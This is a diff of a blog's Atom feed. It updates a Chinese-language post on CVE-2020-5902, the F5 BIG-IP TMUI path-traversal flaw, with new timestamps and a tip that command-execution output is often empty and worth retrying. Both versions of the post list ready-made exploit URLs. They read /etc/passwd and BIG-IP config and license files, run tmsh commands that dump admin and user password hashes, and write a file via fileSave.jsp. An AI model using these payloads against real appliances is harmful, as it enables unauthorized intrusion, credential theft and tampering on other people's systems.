@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.jinny.vip/"/>
-  <updated>2020-07-06T03:55:12.627Z</updated>
+  <updated>2020-07-06T03:57:57.000Z</updated>
   <id>http://www.jinny.vip/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://www.jinny.vip/2020/07/06/cve-2020-5902/"/>
     <id>http://www.jinny.vip/2020/07/06/cve-2020-5902/</id>
     <published>2020-07-06T03:59:25.000Z</published>
-    <updated>2020-07-06T03:55:12.627Z</updated>
+    <updated>2020-07-06T03:57:57.000Z</updated>
     
-    <content type="html"><![CDATA[<p>文件读取</p><p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</p><img src="../img/cve/2020-5902/readfile.png" class="full-image"><p>命令执行</p><p>查看admin的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin<br>查看所有用户的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list auth user</p><img src="../img/cve/2020-5902/rce.png" class="full-image"><p>文件上传</p><p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp<br>POST：fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p><img src="../img/cve/2020-5902/uploadfile-1.png" class="full-image"><img src="../img/cve/2020-5902/uploadfile-2.png" class="full-image">]]></content>
+    <content type="html"><![CDATA[<p>文件读取</p><p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</p><img src="../img/cve/2020-5902/readfile.png" class="full-image"><p>命令执行</p><p>在进行命令执行demo时有较大几率output为空，可多尝试几遍</p><p>查看admin的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin<br>查看所有用户的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list auth user</p><img src="../img/cve/2020-5902/rce.png" class="full-image"><p>文件上传</p><p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp<br>POST：fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p><img src="../img/cve/2020-5902/uploadfile-1.png" class="full-image"><img src="../img/cve/2020-5902/uploadfile-2.png" class="full-image">]]></content>
     
     <summary type="html">
     
